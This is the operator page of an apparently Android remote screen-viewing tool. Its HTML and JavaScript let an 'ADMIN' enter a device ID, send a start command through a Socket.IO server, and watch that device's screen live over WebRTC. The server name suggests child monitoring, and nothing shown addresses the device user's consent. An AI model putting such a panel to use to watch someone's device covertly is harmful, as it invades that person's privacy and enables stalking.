<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Screen Monitor</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>

<style>
body {
  background:#0f0f0f;
  color:#fff;
  text-align:center;
  font-family:Arial;
}

video {
  width:360px;
  height:640px;
  background:black;
  border-radius:20px;
  margin-top:15px;
}

button {
  padding:12px 30px;
  font-size:16px;
  margin:10px;
  border-radius:10px;
}
</style>
</head>

<body>

<h2>ðŸ“± Live Screen Monitor</h2>

<input id="deviceId" placeholder="Device ID">
<br>

<button onclick="startScreen()">START SCREEN</button>
<button onclick="stopScreen()">STOP</button>

<br><br>

<video id="screenVideo" autoplay playsinline></video>

<script>

const socket = io("https://child-v9no.onrender.com");

let pc = null;
let deviceId = null;

socket.on("connect", () => {
  console.log("ADMIN connected");
  socket.emit("join-room", "ADMIN");
});

/* ===============================
   RECEIVE OFFER FROM ANDROID
================================ */
socket.on("offer", async data => {

  console.log("Offer received");

  pc = new RTCPeerConnection({
    iceServers:[
      { urls:"stun:stun.l.google.com:19302" }
    ]
  });

  pc.ontrack = e => {
    document.getElementById("screenVideo").srcObject = e.streams[0];
  };

  pc.onicecandidate = e => {
    if(e.candidate){
      socket.emit("candidate", {
        target: deviceId,
        candidate: e.candidate.candidate,
        sdpMid: e.candidate.sdpMid,
        sdpMLineIndex: e.candidate.sdpMLineIndex
      });
    }
  };

  await pc.setRemoteDescription({
    type:"offer",
    sdp:data.sdp
  });

  const answer = await pc.createAnswer();
  await pc.setLocalDescription(answer);

  socket.emit("answer", {
    target: deviceId,
    sdp: answer.sdp
  });
});

/* ===============================
   BUTTONS
================================ */

function startScreen(){
  deviceId = document.getElementById("deviceId").value;

  socket.emit("screen-start", {
    targetId: deviceId
  });

  console.log("screen-start sent");
}

function stopScreen(){
  socket.emit("screen-stop", {
    targetId: deviceId
  });

  if(pc){
    pc.close();
    pc = null;
  }
}

</script>

</body>
</html>
